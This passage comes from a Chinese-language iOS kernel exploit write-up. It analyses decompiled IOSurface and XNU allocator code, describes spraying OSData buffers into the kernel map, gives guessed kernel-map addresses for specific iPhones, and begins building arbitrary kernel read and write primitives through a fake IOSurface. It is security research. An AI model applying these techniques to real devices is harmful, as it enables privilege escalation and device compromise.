<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">IOSurfaceClient::init_IOSurfaceRootUserClient___IOSurface___bool</span><span class="params">(</span></span><br><span class="line"><span class="params">        IOSurfaceClient *a1,</span></span><br><span class="line"><span class="params">        IOSurfaceRootUserClient *iosruc,</span></span><br><span class="line"><span class="params">        IOSurface *oob_surface,</span></span><br><span class="line"><span class="params">        <span class="type">char</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  a1-&gt;m.surface = oob_surface;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  a1-&gt;m.surface_id = <span class="number">0</span>;</span><br><span class="line">  a1-&gt;m.user_client = iosruc;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !IOSurfaceRootUserClient::set_surface_handle(iosruc, a1, oob_surface-&gt;surface_id) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  a1-&gt;m.surface_id = oob_surface-&gt;surface_id;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span>  </span><br><span class="line"></span><br><span class="line">  surface = a1-&gt;m.surface;</span><br><span class="line">  field_B8 = surface-&gt;field_B8;</span><br><span class="line">  v13 = field_B8 | (((*(*surface-&gt;qword38 + <span class="number">0xA8</span>LL))(surface-&gt;qword38) == <span class="number">2</span>) &lt;&lt; <span class="number">12</span>) | <span class="number">0x4000001</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> v16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就像IOSurfaceSendRight::init一样，oob_surface指向一个IOMFBSwapIORequest对象。对IOSurfaceRootUserClient::set_surface_handle的调用正是为了使新的IOSurfaceClient对象在IOSurface kext中可见。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">IOSurfaceRootUserClient::set_surface_handle</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRootUserClient *iosruc,</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceClient *iosc,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 wanted_handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( wanted_handle &amp;&amp; iosruc-&gt;m.surface_client_array_capacity &gt; wanted_handle )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  result = IOSurfaceRootUserClient::<span class="built_in">alloc_handles</span>(iosruc);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_4:</span><br><span class="line">    surface_client_array = iosruc-&gt;m.surface_client_array;</span><br><span class="line">    <span class="keyword">if</span> ( surface_client_array[wanted_handle] )</span><br><span class="line">      <span class="built_in">panic</span>(</span><br><span class="line">        <span class="string">&quot;\&quot;IOSurfaceRootUserClient::set_surface_handle asked to set handle %08x that was not free: %p\&quot;&quot;</span>,</span><br><span class="line">        wanted_handle,</span><br><span class="line">        iosruc-&gt;m.surface_client_array[wanted_handle]);</span><br><span class="line">    surface_client_array[wanted_handle] = iosc;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果这个函数成功，一个带有指向IOMFBSwapIORequest的指针的IOSurfaceClient对象将被注册在IOSurfaceRootUserClient对象的IOSurfaceClient数组内，该对象被用于调用IOSurfaceRootUserClient::s_lookup_surface_from_port。还有最后一个问题：wanted_handle参数的值是什么？因为它来自oob_surface-&gt;surface_id，让我们检查surface_id的偏移量（x20是oob_surface）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LDR             W2, [X20,#0xC] ; a3</span><br><span class="line">MOV             X0, X21 ; a1</span><br><span class="line">MOV             X1, X19 ; iosruc</span><br><span class="line">BL              IOSurfaceRootUserClient__set_surface_handle</span><br></pre></td></tr></table></figure>

<p>所以IOSurface的surface_id是偏移量为0xc处的32位值。我们能控制IOMFBSwapIORequest对象上偏移量0xc处的32位值吗？不能，因为 IOMFBSwapIORequest::create 会将新的 IOMFBSwapIORequest 对象清零。那么如果它是零呢？这不还是一个有效的ID吗？答案又是否定的，因为IOSurface的ID是从1开始的。零被认为是一个无效的ID。</p>
<p>IOSurfaceClient::init也有一个问题，就是靠近底部的虚函数调用。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a1-&gt;m.surface = oob_surface;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">surface = a1-&gt;m.surface;</span><br><span class="line">field_B8 = surface-&gt;field_B8;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">v13 = field_B8 | (((*(*surface-&gt;qword38 + <span class="number">0xA8LL</span>))(surface-&gt;qword38) == <span class="number">2</span>) &lt;&lt; <span class="number">12</span>) | <span class="number">0x4000001</span>;</span><br></pre></td></tr></table></figure>

<p>如果我们想让IOSurfaceClient::init返回一个成功代码，这个调用是不可避免的。虽然我们确实控制了偏移量0x38的八个字节（这就是qword38所代表的），但我们没有办法伪造vtable指针的PAC。</p>
<p>看起来利用IOSurfaceRootUserClient::s_lookup_surface_from_port来获取一个swap端口的IOSurface ID是不可能的了。</p>
<h2 id="猜测游戏"><a href="#猜测游戏" class="headerlink" title="猜测游戏"></a>猜测游戏</h2><p>zone map并不是唯一可以在内核中进行控制分配的地方。kalloc系列函数有一些非常好的东西：如果分配的大小太大，无法放入任何zone，那么就会从zone map之外返回内存。所有的kalloc变体都会调用<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/kalloc.c#L875">kalloc_ext</a>，它首先会根据传入的分配大小选择区域。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">kalloc_result</span></span><br><span class="line"><span class="built_in">kalloc_ext</span>(</span><br><span class="line">    <span class="type">kalloc_heap_t</span>         kheap,</span><br><span class="line">    <span class="type">vm_size_t</span>             req_size,</span><br><span class="line">    <span class="type">zalloc_flags_t</span>        flags,</span><br><span class="line">    <span class="type">vm_allocation_site_t</span>  *site)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">vm_size_t</span> size;</span><br><span class="line">    <span class="type">void</span> *addr;</span><br><span class="line">    <span class="type">zone_t</span> z;</span><br><span class="line"></span><br><span class="line">    size = req_size;</span><br><span class="line"></span><br><span class="line">    z = <span class="built_in">kalloc_heap_zone_for_size</span>(kheap, size);</span><br><span class="line">    <span class="keyword">if</span> (__improbable(z == ZONE_NULL)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">kalloc_large</span>(kheap, req_size, size, flags, site);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果传递给它的大小大于kalloc_max_prerounded，kalloc_heap_zone_for_size将返回ZONE_NULL。对于iOS 14.6和iOS 14.7，kalloc_max_prerounded是32769字节，因为任何kheap中最大的区域是用于分配高达32768字节的数据。因此，为了使kalloc_heap_zone_for_size返回ZONE_NULL并进入kalloc_large，我们只需要分配大于32768字节的东西。</p>
<p>下面是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/kalloc.c#L744">kalloc_large</a>部分代码:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((noinline))</span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">kalloc_result</span></span><br><span class="line"><span class="built_in">kalloc_large</span>(</span><br><span class="line">    <span class="type">kalloc_heap_t</span>         kheap,</span><br><span class="line">    <span class="type">vm_size_t</span>             req_size,</span><br><span class="line">    <span class="type">vm_size_t</span>             size,</span><br><span class="line">    <span class="type">zalloc_flags_t</span>        flags,</span><br><span class="line">    <span class="type">vm_allocation_site_t</span>  *site)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> kma_flags = KMA_ATOMIC;</span><br><span class="line">    <span class="type">vm_tag_t</span> tag;</span><br><span class="line">    <span class="type">vm_map_t</span> alloc_map;</span><br><span class="line">    <span class="type">vm_offset_t</span> addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    size = <span class="built_in">round_page</span>(size);</span><br><span class="line"></span><br><span class="line">    alloc_map = <span class="built_in">kalloc_map_for_size</span>(size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(alloc_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_map != kernel_map) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(kernel_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">                addr = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            addr = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> kalloc_result)&#123; .addr = (<span class="type">void</span> *)addr, .size = req_size &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/kalloc.c#L608">kalloc_map_for_size</a>只是根据大小来选择适当的地图进行分配。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">vm_map_t</span></span></span><br><span class="line"><span class="function"><span class="title">kalloc_map_for_size</span><span class="params">(<span class="type">vm_size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; kalloc_kernmap_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> kalloc_map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> kernel_map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在iPhone 8和iPhone SE上，kalloc_kernmap_size是0x100001字节。因此，通过调用大于32768字节的东西，我们可以忽略Kheap隔离和封存，并从kalloc地图或内核地图中进行分配。真是一种解脱……</p>
<p>kalloc_large调用kmem_alloc_flags，kmem_alloc_flags尾部调用kernel_memory_allocate。 kernel_memory_allocate通过调用vm_map_find_space在传递给它的vm_map中找到空间。真正重要的是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/vm/vm_map.c#L1731">vm_map_find_space</a>如何找到空闲内存。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span></span></span><br><span class="line"><span class="function"><span class="title">vm_map_find_space</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_t</span>                map,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_offset_t</span>         *address,       <span class="comment">/* OUT */</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_size_t</span>           size,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_offset_t</span>         mask,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span>                     flags,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_kernel_flags_t</span>   vmk_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_tag_t</span>                tag,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">vm_map_entry_t</span>          *o_entry)</span>       <span class="comment">/* OUT */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">vm_map_entry_t</span>          entry, new_entry, hole_entry;</span><br><span class="line">    <span class="type">vm_map_offset_t</span>         start;</span><br><span class="line">    <span class="type">vm_map_offset_t</span>         end;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    new_entry = <span class="built_in">vm_map_entry_create</span>(map, FALSE);</span><br><span class="line">    <span class="built_in">vm_map_lock</span>(map);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; VM_MAP_FIND_LAST_FREE) &#123;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (vmk_flags.vmkf_guard_after) &#123;</span><br><span class="line">            <span class="comment">/* account for the back guard page in the size */</span></span><br><span class="line">            size += <span class="built_in">VM_MAP_PAGE_SIZE</span>(map);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *  Look for the first possible address; if there&#x27;s already</span></span><br><span class="line"><span class="comment">         *  something at this address, we have to start after it.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>“寻找第一个可能的地址 “表明，如果我们在zone map之外进行大量分配，它们最终不仅会被连续布置，而且会按照我们分配的顺序布置。对我们来说，VM_MAP_FIND_LAST_FREE不会被设置为标志，因为那是专门为kheap区域分配新的虚拟内存的选项。</p>
<p>我们应该对内核喷洒什么呢？在Siguza的<a target="_blank" rel="noopener" href="https://blog.siguza.net/v0rtex/">v0rtex</a>的文章中，大于一页的OSData缓冲区会直接进入内核地图，但那是近四年前的事了。我自己检查了一下，看看从那时起是否有什么变化，在我的内核中追踪到OSData::initWithCapacity后，情况仍然如此。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">OSData::initWithCapacity_unsigned_int</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> capacity)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( page_size &gt; capacity )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">kalloc_ext</span>(&amp;KHEAP_DATA_BUFFERS, capacity, <span class="number">0LL</span>, &amp;unk_FFFFFFF009260880);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( capacity &lt; <span class="number">0xFFFFC001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (capacity + <span class="number">0x3FFF</span>) &amp; <span class="number">0xFFFFC000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">kernel_memory_allocate</span>(kernel_map, &amp;v11, v8, <span class="number">0LL</span>, <span class="number">0LL</span>, v9);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，只要我们的分配超过了一个页面，并且不是过分的大，我们就可以把受控的数据放入内核地图。而为了进行OSData分配，我们将利用<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/libkern/c%2B%2B/OSSerializeBinary.cpp#L355">OSUnserializeBinary</a>。这个函数已经存在很久很久了，这里有大量关于其输入数据格式的文档。IOSurfaceRootUserClient外部方法9，即IOSurfaceRootUserClient::s_set_value，使用OSUnserializeBinary来解析其结构输入数据，所以我们可以用它来进行分配。我们还可以用IOSurfaceRootUserClient::s_get_value读回数据，或者用IOSurfaceRootUserClient::s_remove_value释放数据。</p>
<p>喷洒500MB的OSData缓冲区，原因有二：第一，做500MB的分配不需要那么长的时间，第二，做那么多的分配，在某个时间点之后，几乎可以保证可预测和连续的分配。使用<a target="_blank" rel="noopener" href="https://github.com/jsherman212/xnuspy">xnuspy</a>，钩住kernel_memory_allocate，检查它是否被OSData::initWithCapacity调用。如果是的话，把它刚刚分配的页面的地址记录在一个全局数组中。由于xnuspy从可执行文件的<code>__TEXT</code>和<code>__DATA</code>段中创建了共享内存，对这个数组的写入对用户空间代码来说是可见的。喷洒结束后，对该数组内的分配进行了排序，并检查是否有任何漏洞。忽略前1000个分配，因为在那之后我们很有可能只看到连续的、按顺序的分配。如果没有漏洞，就记录下这个范围，在重启后再做几次，得出了iPhone 8的以下范围。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[0xffffffe8cee1c000, 0xffffffe8ec458000)</span><br><span class="line">[0xffffffe8cef78000, 0xffffffe8ec5b0000)</span><br><span class="line">[0xffffffe8ce9b4000, 0xffffffe8ebff4000)</span><br><span class="line">[0xffffffe8cef38000, 0xffffffe8ec570000)</span><br><span class="line">[0xffffffe8cead4000, 0xffffffe8ec10c000)</span><br><span class="line">[0xffffffe8ccdec000, 0xffffffe8ec378000)</span><br></pre></td></tr></table></figure>

<p>算出每个范围的平均数，把它们加到一个列表中，然后取这个列表的平均数来得出我们猜测的内核map指针。对于运行iOS 14.6的iPhone 8来说，这个指针是0xffffffe8dd594000，而且出奇地可靠。但是，iOS 14.7的iPhone SE是另一个故事。那部手机的地址空间被诅咒了。不确定是什么原因导致了这种奇怪的现象，但还是能够得出一个猜测：0xfffff9942d0000。这个猜测有大约50%的成功率，而iPhone 8的猜测则倾向于90%。</p>
<p>你可以在这里找到kernel_memory_allocate的<a target="_blank" rel="noopener" href="https://github.com/jsherman212/iomfb-exploit/blob/main/kernel_hooks.c">钩子</a>，在这里找到<a target="_blank" rel="noopener" href="https://github.com/jsherman212/iomfb-exploit/blob/608471b6b649986cf411fce530ec3aa879c063cf/IOMobileFramebufferUserClient.c#L586">分析</a>全局数组的代码，在这里找到生成猜测的<a target="_blank" rel="noopener" href="https://github.com/jsherman212/iomfb-exploit/blob/main/alloc_averager.py">python</a>脚本。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Stage-0"><a href="#Stage-0" class="headerlink" title="Stage 0"></a>Stage 0</h2><p>有了一个用于32位增量的指针，我开始思考这个漏洞的最终目标是什么，因为它不会是一个假的内核任务端口。用一个假的IOSurface对象代替怎么样？如果IOSurface::increment_use_count在偏移量0xc0处读出一个指针来增加 “使用次数”，我想是否有一个IOSurfaceRootUserClient的外部方法来读取这个 “使用次数”……哦，看，有的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurfaceRootUserClient::get_surface_use_count</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRootUserClient *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        _DWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v6 = <span class="number">0xE00002C2</span>;</span><br><span class="line">  <span class="built_in">lck_mtx_lock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;m.surface_client_array_capacity &gt; a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = a1-&gt;m.surface_client_array[a2];</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        *a3 = IOSurfaceClient::<span class="built_in">get_use_count</span>(v7);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">lck_mtx_unlock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurfaceClient::get_use_count:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD __fastcall <span class="title">IOSurfaceClient::get_use_count</span><span class="params">(IOSurfaceClient *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> IOSurface::<span class="built_in">get_use_count</span>(a1-&gt;m.surface);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurface::get_use_count:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD __fastcall <span class="title">IOSurface::get_use_count</span><span class="params">(IOSurface *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> *(_DWORD *)(a1-&gt;qwordC0 + <span class="number">0x14LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们控制一个IOSurface对象，我们就控制了内核指针的偏移量0xc0。因此，通过调用这个IOSurfaceRootUserClient::s_get_surface_use_count与一个被控制的IOSurface，我们会有一个任意的32位内核读取。但是一个任意的写呢？这个位于偏移量0xc0的指针似乎有很大的意义。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurfaceRootUserClient::set_compressed_tile_data_region_memory_used_of_plane</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRootUserClient *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 a3,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v8 = <span class="number">0xE00002C2</span>;</span><br><span class="line">  <span class="built_in">lck_mtx_lock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;m.surface_client_array_capacity &gt; a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = a1-&gt;m.surface_client_array[a2];</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">        v8 = IOSurfaceClient::<span class="built_in">setCompressedTileDataRegionMemoryUsageOfPlane</span>(v9, a3, a4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">lck_mtx_unlock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurfaceClient::setCompressedTileDataRegionMemoryUsageOfPlane:</p>
